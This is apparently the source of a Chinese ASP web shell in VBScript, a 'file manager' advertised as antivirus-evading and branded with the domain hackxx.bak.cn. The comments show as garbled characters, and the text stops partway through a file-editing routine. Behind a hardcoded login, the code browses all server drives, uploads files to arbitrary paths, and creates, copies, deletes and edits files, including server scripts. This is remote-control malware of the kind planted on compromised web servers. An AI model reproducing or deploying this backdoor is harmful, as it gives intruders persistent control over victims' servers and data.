   <%@ LANGUAGE = VBScript CodePage = 936%>
   <%
   option explicit
   Response.Buffer=True
   Server.Scripttimeout=5000
   ':::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
   ':::::ÐÂÕ¾³¤ÖúÊÖ¹¦ÄÜÔöÇ¿ÃâÉ±°æ:::::::::::::::::::::::::::::::::::::::::::::::
   ':::::Ê¹ÓÃ±¾³ÌÐòµÄÇ°ÌáÊÇ·þÎñÆ÷±ØÐë°²×°ÎÄ±¾¶ÁÐ´×é¼þ£¨FSO£©:::::::::::
   ':::::±ØÐëÐÞ¸ÄÑéÖ¤ÓÃ»§Ãû¼°ÃÜÂë::::::::::::::::::::::::::::::::::::::
   ':::::²éÕÒ[UserName]="hackxx.bak.cn"£»Ä¬ÈÏÖµÎª[hackxx.bak.cn]:::::::::::::::::::::::::
   ':::::²éÕÒ[UserPassword]="hackxx.bak.cn"£»Ä¬ÈÏÖµÎªhackxx.bak.cn:::::::::::::::::::
   ':::::»¶Ó·ÃÎÊÎÒµÄÍøÕ¾£ºhackxx.bak.cn:::::::::::::::::::::::::
   ':::::»¶Ó¼ÓÈëQQÈº(11682175)¹²Í¬½»Á÷£º:::::::::::::::::::::::::::::::
   ':::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
   %>
   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <title>...::::::ÐÂÕ¾³¤ÖúÊÖASPÕ¾³¤ÎÄ¼þ¹ÜÀíÖúÊÖ³¬¼¶°æ¾ø¶ÔÃâÉ±£¡::::::...</title>
   <style>
   <!--
   a            { color: #000080; font-size: 10pt; text-decoration: blink }
   a:hover      { color: #9966FF; text-decoration: blink; font-size: 10pt; font-family: ËÎÌå }
   a:active     { font-family: ËÎÌå; font-size: 10pt; text-decoration: blink; color: #000080 }
   a:link       { color: #000080; font-family: ËÎÌå; font-size: 10pt; text-decoration:blink }
   table        { font-family: ËÎÌå; font-size: 10pt; word-break: break-all}
   td           { font-family: ËÎÌå; font-size: 10pt; word-break: break-all}
   textarea     { font-family: ËÎÌå; font-size: 10pt}
   input        { color: #000080; border: 1px solid #000000; background-color: #F7F7F7; word-break: break-all}
   .button       { color: #000000; border: 1px outset #000000; background-color: #C0C0C0; word-break: break-all}
   .table1      { font-family: ËÎÌå; font-size: 10pt; border: 1px solid #F6F6F6; word-break: break-all}
   .td1         { font-family: ËÎÌå; font-size: 10pt; border: 1px solid #F6F6F6; word-break: break-all}
   th         { font-family: ËÎÌå; font-size: 10pt; border: 1px solid #F6F6F6; background-color:#D1D1E0; word-break: break-all}
   -->
   </style>
   <script language="javascript">
   <!--
   function InSQLString(SQLStrings){
   document.DatePathForm.SQLString.value = SQLStrings;
   //alert(SQLStrings)
   }

   function ShowWin(Url,Name,X,Y,K){
   if (!K==""){
    var Ask=confirm("ÄúÈ·ÊµÒª½øÐÐ"+K+"²Ù×÷Âð£¿Ò²Ðí»á´øÀ´²»±ØÒªµÄÂé·³£»ÇëÉ÷ÖØ¡£");
       if (Ask){
       window.open(Url,Name,"toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,width="+X+",height="+Y);
       return false;
       }

   }
   if (K==""){
   window.open(Url,Name,"toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,width="+X+",height="+Y);
   }
   }


   function setid()
   {
   var str=""
   if(!window.PutFileForm.upcount.value==0)
   for(i=1;i<=window.PutFileForm.upcount.value;i++)
   str+='±¾µØÎÄ¼þ'+i+':<input type=file name=file'+i+' size=37><br>';
   document.getElementById("nStr").innerHTML= str;
   }

   function PostSrt(){
   var MyRegExp = document.getElementById("nStr").innerHTML
       MyRegExp = MyRegExp.replace(/<!--/ig, "")
       MyRegExp = MyRegExp.replace(/\/\/-->/ig, "");
       //alert(document.getElementById("nStr").innerHTML)
   document.EditFileForm.FileStr.value = MyRegExp
   }
   //-->
   </script>
   </head>
   <body>
   <%
   '::::::::::::::ÉùÃ÷¹«¹²±äÁ¿:::::::::::::::::::::

   Dim FileName, oPath, allPath, SpPath, Obj
   FileName = Request.Servervariables("PATH_INFO")
   oPath = Request.Servervariables("APPL_PHYSICAL_PATH")
   allPath = Request.Servervariables("PATH_TRANSLATED")
   'µÃµ½Ö÷Ö´ÐÐÎÄ¼þÃû
   SpPath = Right(allPath,Len(allPath)-InstrRev(allPath,"\"))
   Set Obj = CreateObject("Scripting.FileSystemObject")
   'Response.Write "<br>1."&FileName&"<br>2."&oPath&"<br>3."&allPath
   dim Data_5xsoft
   On Error Resume Next
   Class upload_5xsoft

   dim objForm,objFile,Version

   Public function Form(strForm)
      strForm=lcase(strForm)
      if not objForm.exists(strForm) then
        Form=""
      else
        Form=objForm(strForm)
      end if
    end function

   Public function File(strFile)
      strFile=lcase(strFile)
      if not objFile.exists(strFile) then
        set File=new FileInfo
      else
        set File=objFile(strFile)
      end if
    end function


   Private Sub Class_Initialize
     dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
     dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
     dim iFindStart,iFindEnd
     dim iFormStart,iFormEnd,sFormName
     Version="»¯¾³HTTPÉÏ´«³ÌÐò Version 2.0"  '·Ç±¾ÈËËù´´,¸Ãº¯ÊýÎªÔ×÷Õß³É¹û,¾Í´Ë¸ÐÐ»!
     set objForm=Server.CreateObject("Scripting.Dictionary")
     set objFile=Server.CreateObject("Scripting.Dictionary")
     if Request.TotalBytes<1 then Exit Sub
     set tStream = Server.CreateObject("adodb.stream")
     set Data_5xsoft = Server.CreateObject("adodb.stream")
     Data_5xsoft.Type = 1
     Data_5xsoft.Mode =3
     Data_5xsoft.Open
     Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
     Data_5xsoft.Position=0
     RequestData =Data_5xsoft.Read

     iFormStart = 1
     iFormEnd = LenB(RequestData)
     vbCrlf = chrB(13) & chrB(10)
     sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
     iStart = LenB (sStart)
     iFormStart=iFormStart+iStart+1
     while (iFormStart + 10) < iFormEnd
       iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
       tStream.Type = 1
       tStream.Mode =3
       tStream.Open
       Data_5xsoft.Position = iFormStart
       Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
       tStream.Position = 0
       tStream.Type = 2
       tStream.Charset ="gb2312"
       sInfo = tStream.ReadText
       tStream.Close
       'È¡µÃ±íµ¥ÏîÄ¿Ãû³Æ
       iFormStart = InStrB(iInfoEnd,RequestData,sStart)
       iFindStart = InStr(22,sInfo,"name=""",1)+6
       iFindEnd = InStr(iFindStart,sInfo,"""",1)
       sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
       'Èç¹ûÊÇÎÄ¼þ
       if InStr (45,sInfo,"filename=""",1) > 0 then
           set theFile=new FileInfo
           'È¡µÃÎÄ¼þÃû
           iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
           iFindEnd = InStr(iFindStart,sInfo,"""",1)
           sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
           theFile.FileName=getFileName(sFileName)
           theFile.FilePath=getFilePath(sFileName)
           'È¡µÃÎÄ¼þÀàÐÍ
           iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
           iFindEnd = InStr(iFindStart,sInfo,vbCr)
           theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
           theFile.FileStart =iInfoEnd
           theFile.FileSize = iFormStart -iInfoEnd -3
           theFile.FormName=sFormName
           if not objFile.Exists(sFormName) then
             objFile.add sFormName,theFile
           end if
       else
       'Èç¹ûÊÇ±íµ¥ÏîÄ¿
           tStream.Type =1
           tStream.Mode =3
           tStream.Open
           Data_5xsoft.Position = iInfoEnd
           Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
           tStream.Position = 0
           tStream.Type = 2
           tStream.Charset ="gb2312"
               sFormValue = tStream.ReadText
               tStream.Close
           if objForm.Exists(sFormName) then
             objForm(sFormName)=objForm(sFormName)&", "&sFormValue
           else
             objForm.Add sFormName,sFormValue
           end if
       end if
       iFormStart=iFormStart+iStart+1
       wend
     RequestData=""
     set tStream =nothing
   End Sub

   Private Sub Class_Terminate
    if Request.TotalBytes>0 then
       objForm.RemoveAll
       objFile.RemoveAll
       set objForm=nothing
       set objFile=nothing
       Data_5xsoft.Close
       set Data_5xsoft =nothing
    end if
   End Sub


    Private function GetFilePath(FullPath)
     If FullPath <> "" Then
      GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
     Else
      GetFilePath = ""
     End If
    End  function

    Private function GetFileName(FullPath)
     If FullPath <> "" Then
      GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
     Else
      GetFileName = ""
     End If
    End  function
   End Class

   Class FileInfo
     dim FormName,FileName,FilePath,FileSize,FileType,FileStart
     Private Sub Class_Initialize
       FileName = ""
       FilePath = ""
       FileSize = 0
       FileStart= 0
       FormName = ""
       FileType = ""
     End Sub

    Public function SaveAs(FullPath)
       dim dr,ErrorChar,i
       SaveAs=true
       if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
       set dr=CreateObject("Adodb.Stream")
       dr.Mode=3
       dr.Type=1
       dr.Open
       Data_5xsoft.position=FileStart
       Data_5xsoft.copyto dr,FileSize
       dr.SaveToFile FullPath,2
       dr.Close
       set dr=nothing
       SaveAs=false
     end function
     End Class


   Public Function Show(ErrString)
   Response.Write "<FONT COLOR='#FF0000'><li>"&ErrString&"</FONT><br>"
   Response.Write "<br><CENTER><INPUT type='text' name='T1' size='15' style='color: #000080; font-family: ËÎÌå; font-weight: bold; background-color: #FFFFFF; border: 1 double #FFFFFF'>"&Chr(13)
   Response.Write "<SCRIPT LANGUAGE='vbScript'>"&Chr(13)&_
   "Dim l,t1,t2,thetime,isStop"&Chr(13)&_
   "t1=timer+3"&Chr(13)&_
   "isStop = False"&Chr(13)&_
   "Sub tx()"&Chr(13)&_
   "if isStop then"&Chr(13)&_
   "exit Sub"&Chr(13)&_
   "else"&Chr(13)&_
   "setTimeout""tx()"",""1000"""&Chr(13)&_
   "end if"&Chr(13)&_
   "t2=timer"&Chr(13)&_
   "thetime=int(t1)-int(t2)"&Chr(13)&_
   "document.all.T1.value=thetime&"" ÃëÖÓºó¹Ø±Õ±¾´°¿Ú£¡http://hackxx.bak.cn/"""&Chr(13)&_
   "if thetime=""0"" or thetime<""0"" then"&Chr(13)&_
   "window.close()"&Chr(13)&_
   "isStop=True"&Chr(13)&_
   "end if"&Chr(13)&_
   "End Sub"&Chr(13)&_
   "Call tx()"&Chr(13)&_
   "</SCRIPT></CENTER>"
   End Function
   '·ÀÖ¹Ö÷Ö´ÐÐÎÄ¼þ±»²Ù×÷!
   Public Function IsRoot(PathStr)
   If Lcase(PathStr) = Lcase(allPath) Then
   Show("²»ÄÜ¶ÔÖ÷Ö´ÐÐ³ÌÐò½øÐÐ²Ù×÷;±¾²Ù×÷ÒÑ¾±»½ûÖ¹.")
   Response.End
   End If
   End Function
   Function IsObjInstalled(strClassString)
       On Error Resume Next
       IsObjInstalled = False
       Err = 0
       Dim xTestObj
       Set xTestObj = Server.CreateObject(strClassString)
       If 0 = Err Then IsObjInstalled = True
       Set xTestObj = Nothing
       Err = 0
   End Function


   %> <div align="center"><table border="0" width="450" id="table1" cellspacing="0"><tr><td><%
   If Request.QueryString("Work") = "outlogin" Then
      Session("UserCokis_Name") =""
      Session("UserCokis_Pass") =""
      Show("ÍË³ö³É¹¦!")
      Response.Write"<script>opener.window.location.reload()</script>"
      Response.end
   End If
   If Session("UserCokis_Name") ="" Or Session("UserCokis_Pass") ="" Then
   Response.Write"<form method='POST' action='"&Filename&"?Work=login' name='LoginForm'>"&_
   "<p align='center'>ÓÃ»§Ãû£º<input type='text' name='MyName' size='10'>"&Chr(13)&"ÑéÖ¤Âë£º<input type='password' name='MyPass' size='10'>"&Chr(13)&"<input type='submit' value='µÇÂ½' name='B1' class='button'></p></form>"

   If Request.QueryString("Work") = "login" Then
     Dim UserName,UserPassword,PostName,PostPW
      PostName = Trim(Request("MyName"))
      PostPW = Request("MyPass")
      UserName = "hackxx.bak.cn"
      UserPassword = "hackxx.bak.cn"
    If UserName = PostName  And UserPassword = PostPW  Then
      Session("UserCokis_Name") = PostName
      Session("UserCokis_Pass") = PostPW
      Response.Redirect Filename
   Else
      Response.Write "<p align='center'><font color=red>ÑéÖ¤Î´Í¨¹ý£¡</font></p>"
    End If

   End If
   If Not IsObjInstalled("Scripting.FileSystemObject") Then
   Response.Write"<li>·Ç³£ÒÅº¶£¬±¾·þÎñÆ÷²»Ö§³ÖFSO¡£±¾³ÌÐòÈ«²¿¹¦ÄÜÎÞ·¨ÔËÐÐ£¡http://hackxx.bak.cn/"
   Response.End
   Else
   Response.Write"<li>±¾·þÎñÆ÷Ö§³ÖFSO£¡Äú¿ÉÒÔÊ¹ÓÃ±¾³ÌÐò½øÐÐÔ¶³ÌÍøÕ¾ÎÄ¼þ¹ÜÀí²Ù×÷¡£hackxx.bak.cn/<br>"
   Response.Write"<li>ÎªÁË·ÀÖ¹±»ÒâÍâÉ¾³ý£¬½¨Òé±¾ÎÄ¼þÓ¦°²×°ÔÚÍøÕ¾µÄ¸ùÄ¿Â¼ÏÂ¡£"
   End If

   Else
   Sub SaveUp()
   Dim Upload,File,Formname,Formpath,Icount
   Icount = 0
   Set Upload=New Upload_5xsoft ''½¨Á¢ÉÏ´«¶ÔÏó
   If Upload.Form("PutPaht")="" Then   ''µÃµ½ÉÏ´«Ä¿Â¼
    Show("ÇëÊäÈëÒªÉÏ´«µÄÄ¿Â¼!")
    Set Upload=Nothing
   Else
    Formpath=Upload.Form("PutPaht")
    If Right(Formpath,1)<>"\" Then Formpath=Formpath&"\"
   End If
   For Each Formname In Upload.Objfile ''ÁÐ³öËùÓÐÉÏ´«ÁËµÄÎÄ¼þ
    Set File=Upload.File(Formname)  ''Éú³ÉÒ»¸öÎÄ¼þ¶ÔÏó
   If File.Filesize > 0 Then         ''Èç¹û Filesize > 0 ËµÃ÷ÓÐÎÄ¼þÊý¾Ý
     File.Saveas Formpath&File.Filename  ''±£´æÎÄ¼þ
     Response.Write "<li>±¾µØÎÄ¼þ£º"&File.Filepath&File.Filename&"<br>"
     Response.Write "<li>´óÐ¡£º"
        If Formatnumber(File.Filesize/1024)< 1 then
          Response.Write"0"&Formatnumber(File.Filesize/1024)
        Else
          Response.Write Formatnumber(File.Filesize/1024)
        End If
     Response.Write "(KB)<br><li>³É¹¦ÉÏ´«µ½£º"&Formpath&File.Filename&"<br>"
     Icount=Icount+1
   End If
    Set File=Nothing
   Next
   Set Upload=Nothing  ''É¾³ý´Ë¶ÔÏó
   If Icount>0 Then
   Show("¹²ÓÐ£º"&Icount&" ¸öÎÄ¼þ³É¹¦ÉÏ´«¡£")
   Response.Write"<script>opener.window.location.reload()</script>"
   Else
   Show("Ã»ÓÐÎÄ¼þÉÏ´«")
   End If
   End Sub

   %> <%Sub UpFileWim(PutPath)%> <table border="1" width="100%" id="table2" class="td1"><tr><form method="POST" action="<%=FileName%>?Work=PutFile" name="PutFileForm" enctype="multipart/form-data"><th colspan="2">ÎÄ¼þÉÏ´«</th></tr><tr><td class="td1" align="right" width="16%">ÉÏ´«Â·¾¶:</td><td class="td1" width="81%"><input type="text" name="PutPaht" size="50" value="<%=PutPath%>" ReadOnly></td></tr><tr><td class="td1" align="right" width="16%">ÉÏ´«¸öÊý:</td><td class="td1" width="81%"><input type="text" name="upcount" size="10" value="1" maxlength="1"> <input type="button" name="Bn" onclick="setid();" value="Éè¶¨" class="button"> (<FONT COLOR="#FF0000">Ö»ÄÜÍ¬Ê±ÉÏ´«9¸öÒÔÏÂµÄÎÄ¼þ.</FONT>) </td></tr><tr><td class="td1" align="center" colspan="2"><SPAN id="nStr"></SPAN></td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="È·¶¨ÉÏ´«" name="B1" class="button"></td></form></tr></table><%End Sub%> <%
   Sub SaveFolder(FolderPath,FolderName)
   On Error Resume Next
   If Instr(FolderPath,":")=0 Then
          FolderPath=Server.Mappath(FolderPath)
   End If
   If FolderName = "" Then
   Show("ÇëÊäÈëÎÄ¼þ¼ÐÃû³Æ¡£")
          Exit Sub
   End If
   If (Obj.FolderExists(FolderPath&"\"&FolderName)) Then
       Show("ÎÄ¼þ¼ÐÒÑ¾´æÔÚ,²»±ØÔÙ½¨Á¢.")
       Exit Sub
     Else
       Obj.CreateFolder(FolderPath&"\"&FolderName)
       If Err Then
        Show("ÎÞ·¨½¨Á¢ÎÄ¼þ¼Ð.ÔÒòÊÇ:"&Err.Description)
        Err.Clear
        Exit Sub
        Else
       Show("ÄúÒÑ¾³É¹¦µØÔÚ"&FolderPath&"ÏÂ½¨Á¢ÃûÎª:"&FolderName&"µÄÎÄ¼þ¼Ð.")
       Response.Write"<script>opener.window.location.reload()</script>"
       End If
     End If
   End Sub
   %> <%
   Sub FolderWin(NewFolderPath)
   %> <!--ÐÂ½¨ÎÄ¼þ¼Ð´°Ìå½çÃæ¿ªÊ¼-->¡¡<table border="0" width="100%" id="table3" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=NewFolder" name="NewFolderForm"><th colspan="2">ÐÂ½¨ÎÄ¼þ¼Ð</th></tr><tr><td class="td1" width="15%" align="right">Ä¿±êÂ·¾¶:</td><td class="td1" width="81%"><input type="text" name="FolderPath" size="51" value="<%=NewFolderPath%>" readOnly></td></tr><tr><td class="td1" width="15%" align="right">ÎÄ¼þ¼ÐÃû:</td><td class="td1" width="81%"><input type="text" name="NewFolder" size="20" maxlength="20" value="<%=Date()%>">(<font color="#FF0000">×¢Òâ:²»ÒªÐ´µÃÌ«³¤¡£</font>)</td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="Ìá½»" name="B2" class="button"></td></form></tr></table><!--ÐÂ½¨ÎÄ¼þ¼Ð´°Ìå½çÃæ½áÊø--><%End Sub%> <%
   Sub SaveFile(SavePath,NewFileName)
   On Error Resume Next
   Dim f
   If Instr(SavePath,":")=0 Then
          SavePath=Server.Mappath(SavePath)
   End If
   If NewFileName = "" Then
   Show("ÎÄ¼þÃû³Æ²»ÄÜÎª¿Õ¡£")
   Exit Sub
   End If
   Set f = Obj.CreateTextFile(SavePath&"\"&NewFileName,False)
       If Err Then
        Show("ÎÞ·¨½¨Á¢ÎÄ¼þ.ÔÒòÊÇ:"&Err.Description)
        Err.Clear
        Else
       Show("ÄúÒÑ¾³É¹¦µØÔÚ"&SavePath&"ÏÂ½¨Á¢ÃûÎª:"&NewFileName&"µÄÎÄ¼þ.")
       Response.Write"<script>opener.window.location.reload()</script>"
       End If
   End Sub
   %> <%Sub FileWin(NewFilePath)%> <!--ÐÂ½¨¿ÕÎÄ¼þ´°Ìå½çÃæ¿ªÊ¼-->¡¡<table border="0" width="100%" id="table5" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=NewFile" name="NewFileForm"><th colspan="2">ÐÂ½¨Ò»¸ö¿ÕÎÄ¼þ</th></tr><tr><td class="td1" align="right" width="15%">Ä¿±êÂ·¾¶:</td><td class="td1" width="82%"><input type="text" name="FilePath" size="51" value="<%=NewFilePath%>" readOnly></td></tr><tr><td class="td1" align="right" width="15%">ÎÄ¼þÃû³Æ:</td><td class="td1" width="82%"><input type="text" name="NewFileName" size="20" maxlength="20" value="<%=Replace(Date(),"-","")&Replace(Time(),":","")%>.htm">(<font color="#FF0000">×¢Òâ:ÌîÐ´ÍêÕûÃû³Æ¼°ºó×ºÃû</font>)</td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="Ìá½»" name="B3" class="button"> </td></form></tr></table><!--ÐÂ½¨¿ÕÎÄ¼þ´°Ìå½çÃæ½áÊø--><%End Sub%> <%
   Sub CopyFile(CopyPath,CopyName)
   On Error Resume Next
   Dim cFile
   If Instr(CopyName,":")=0 Then
          CopyName=Server.Mappath(CopyName)
   End If
       Set cFile = Obj.GetFile(CopyPath)
       cFile.Copy (CopyName)
       If Err Then
        Show("ÎÞ·¨¸´ÖÆÎÄ¼þ.ÔÒòÊÇ:"&Err.Description)
        Err.Clear
        Else
       Show("ÎÄ¼þÒÑ¾³É¹¦¸´ÖÆµ½:"&CopyName)
       Response.Write"<script>opener.window.location.reload()</script>"
       End If
   End Sub
   %> <%Sub CopyFileWin(CopyPath)%> <table border="0" width="100%" id="table6" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=CopyFiles" name="CopyForm"><th colspan="2">ÎÄ¼þ¸´ÖÆ</th></tr><tr><td class="td1" width="17%" align="right">Ô´ÎÄ¼þ£º</td><td class="td1" width="80%"><input type="text" name="CopyPath" size="47" readonly value="<%=CopyPath%>"> </td></tr><tr><td class="td1" width="17%" align="right">Ä¿±êÎÄ¼þ£º</td><td class="td1" width="80%"><input type="text" name="NewCopyName" size="47" value="<%=CopyPath%>"><br>(<font color="#FF0000">×¢Òâ£º±ØÐëÊÇÍêÕûµÄÏà¶ÔÂ·¾¶»ò¾ø¶ÔÂ·¾¶¼°ÎÄ¼þÃûºÍºó×ºÃû</font>)</td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="¸´ÖÆ" name="B4" class="button"></td></form></tr></table><%End Sub%> <%Sub ListFileWin(ListPath)
   On Error Resume Next
   If ListPath="" Then
   ListPath = Server.Mappath("\")
   End If
   Dim AllFolder,ItFolserd,FL,dr
   Set AllFolder = Obj.GetFolder(ListPath)
   Set ItFolserd = AllFolder.SubFolders
   %> <table border="0" width="100%" id="table4" class="table1" bgcolor="#F6F6F6" cellspacing="0" cellpadding="0"><tr><th colspan="2">ÎÄ¼þ¼°ÎÄ¼þ¼ÐÁÐ±í</th></tr><tr><td bgcolor="#EAEAEA" class="td1" colspan="2">µ±Ç°Â·¾¶:<%=ListPath%></td></tr><tr><td bgcolor="#F6F6F6" class="td1" colspan="2"><%
   For Each Dr in Obj.Drives
   Response.write "<a href='"&FileName&"?Work=ShowListFileWin&ListPath="&Dr.DriveLetter&":'>"&Dr.DriveLetter&"ÅÌ:</a>        "
   NEXT
   %> </td></tr><%
   If Err Then
   Show("ÒÅº¶;Ã»ÓÐä¯ÀÀÈ¨ÏÞ;")
   Exit Sub
   Else
   For Each FL in ItFolserd
   %> <tr onmouseover="this.bgColor='#CCFF99';" onmouseout="this.bgColor='#F6F6F6'"><td class="td1" width="61%" title="ÎÄ¼þ¼Ð: <%=FL.name%>"><font face="Wingdings" color="#FF9933">1</font> <A HREF="<%=FileName%>?Work=ShowListFileWin&ListPath=<%=ListPath&"\"&FL.name%>" title="´´½¨Ê±¼ä:<%=FL.DateCreated&Chr(10)%>×îºó·ÃÎÊ:<%=FL.DateLastAccessed&Chr(10)%>×îºóÐÞ¸Ä:<%=FL.DateLastModified&Chr(10)%>¹À¼Æ´óÐ¡:<%=FL.size\1024%>(KB)"><%=FL.name%></A> </td><td class="td1" width="37%">&nbsp; [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowDelFolderwin&DelFolderPath=<%=replace(ListPath&"\"&FL.name,"\","\\")%>','FdelWin','500','150','É¾³ý')" title="É¾³ý[<%=FL.name%>]ÎÄ¼þ¼Ð"><FONT COLOR="#FF0000">É¾³ý</FONT></A>]¡¡</td></tr><%
   Next
   End If
   Dim SiteUrl,Item
             if ListPath = Server.MapPath("\") Then
             SiteUrl = "/"
             else
             SiteUrl = "/"&Right(ListPath,Len(ListPath)-Len(oPath))&"/"
             end if
             Dim Ac
    For Each Item In AllFolder.Files
   %> <tr onmouseover="this.bgColor='#CCFF99';" onmouseout="this.bgColor='#F6F6F6'"><td height="17" class="td1" width="61%" title="ÎÄ¼þ: <%=Item.name%>"><font face="Wingdings" color="#FF0000">y</font> <A target="_blank" HREF="<%=SiteUrl&Item.name%>" title="´´½¨Ê±¼ä:<%=Item.DateCreated&Chr(10)%>ÐÞ¸ÄÊ±¼ä:<%=Item.DateLastModified&Chr(10)%>ÎÄ¼þ´óÐ¡:<%If Formatnumber(Item.Size/1024)< 1 then Response.Write"0"&Formatnumber(Item.Size/1024) Else Response.Write Formatnumber(Item.Size/1024) End If%>(KB)"><%=Item.name%></A> </td><td height="17" class="td1" width="37%">¡¡[<A HREF="#" onClick="JavaScript: ShowWin('<%=Filename%>?Work=ShowDelFilewin&DelPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','delWin','500','150','É¾³ý')" title="É¾³ý[<%=Item.name%>]ÎÄ¼þ"><FONT COLOR="#FF0000">É¾³ý</FONT></A>] [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowCopyFileWin&CopyPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','CopyWin','500','190','')" title="¸´ÖÆ:<%=Item.name%>"><FONT COLOR='#FF9933'>¸´ÖÆ</FONT></A>]
   <%
   Ac = split(Item.name,".")
   If Lcase(Ac(UBound(Ac,1)))="txt" Or Lcase(Ac(UBound(Ac,1)))="htm" Or Lcase(Ac(UBound(Ac,1)))="asa" Or Lcase(Ac(UBound(Ac,1)))="html" Or Lcase(Ac(UBound(Ac,1)))="shtml" Or Lcase(Ac(UBound(Ac,1)))="asp" Or Lcase(Ac(UBound(Ac,1)))="inc" Or Lcase(Ac(UBound(Ac,1)))="ini" Or Lcase(Ac(UBound(Ac,1)))="m3u"  Or Lcase(Ac(UBound(Ac,1)))="cer" Or Lcase(Ac(UBound(Ac,1)))="htr" Or Lcase(Ac(UBound(Ac,1)))="js" Or Lcase(Ac(UBound(Ac,1)))="css" Or Lcase(Ac(UBound(Ac,1)))="cdx" Then%> [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowEditFileWin&EditPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','EditWin','500','450','')" title="±à¼[<%=Item.name%>]ÎÄ¼þ">±à¼</A>] <%End if%> <%If  Lcase(Ac(UBound(Ac,1)))="mdb" Then %> [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowMdbWin&MdbPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','mdbWin','500','190','')" title="Ñ¹Ëõ[<%=Item.name%>]Êý¾Ý¿â"><FONT COLOR="#993300">Ñ¹Ëõ</FONT></A>] <%End If%> </td></tr><%Next%> <tr><td class="td1" align="center" colspan="2"><FONT COLOR="#009900"><li>ÌáÊ¾:µã»÷ÎÄ¼þÃû¼´¿É WEB ä¯ÀÀ·ÃÎÊ! </FONT><br>[<a href="#" onClick="javascript:history.back();" title="·µ»ØÉÏÒ»¸öÄ¿Â¼"><font color="#FF0000">ÏòÉÏ</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowListFileWin&ListPath=<%=Replace(Server.Mappath("\"),"\","\\")%>','ListWin','500','500','')" title="·µ»Ø¸ùÄ¿Â¼"><font color="#FF0000">·µ»Ø¸ùÄ¿Â¼</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowUpFileWin&PutPath=<%=Replace(ListPath,"\","\\")%>','UpWin','500','300','','')" title="ÔÚ±¾Ä¿Â¼ÏÂÉÏ´«ÎÄ¼þ"><font color="#FF0000">ÎÄ¼þÉÏ´«</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowFileWin&NewFilePath=<%=Replace(ListPath,"\","\\")%>','FileWin','500','190','','')" title="ÔÚ±¾Ä¿Â¼ÏÂÐÂ½¨¿ÕÎÄ¼þ"><font color="#FF0000">ÐÂ½¨ÎÄ¼þ</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowFolderWin&NewFolderPath=<%=Replace(ListPath,"\","\\")%>','FolderWin','500','190','','')" title="ÔÚ±¾Ä¿Â¼ÏÂÐÂ½¨ÎÄ¼þ¼Ð"><font color="#FF0000">ÐÂ½¨ÎÄ¼þ¼Ð</font></a>] </td></tr></table><%End Sub%> <%
   Sub SaveEditFile(ReFilePath,EditStrings)

   On Error Resume Next
   Dim MyWrite
   Set MyWrite = Obj.OpenTextFile(ReFilePath, 2)
   MyWrite.WriteLine(EditStrings)
   If Err Then
   Show("ÒÅº¶,Ã»ÓÐ²Ù×÷È¨ÏÞ.")
   Else
   Show("ÎÄ¼þÐÞ¸Ä³É¹¦!")
   End If
   Set Obj = Nothing
   End Sub
   Sub EditFile(GetMyFilePath)
   Call IsRoot(GetMyFilePath)
   On Error Resume Next
   Dim MyRead,Strings
   Set MyRead = Obj.OpenTextFile(GetMyFilePath, 1, True, 0)
   Strings = MyRead.ReadAll
   MyRead.Close
   'ÒÔÏÂ²¿·ÖÊÇÕë¶Ô´ò¿ªHTMLÎÄµµÊ±µÄ´¦Àí¡£
   '½«ÎÄµµÀïµÄHTML×¢ÊÍ±ê×¢È¥µô¡£
   Strings = Replace(Strings,"<!--", "")
   Strings = Replace(Strings,"//-->", "")
   Strings = Replace(Strings,"-->", "")
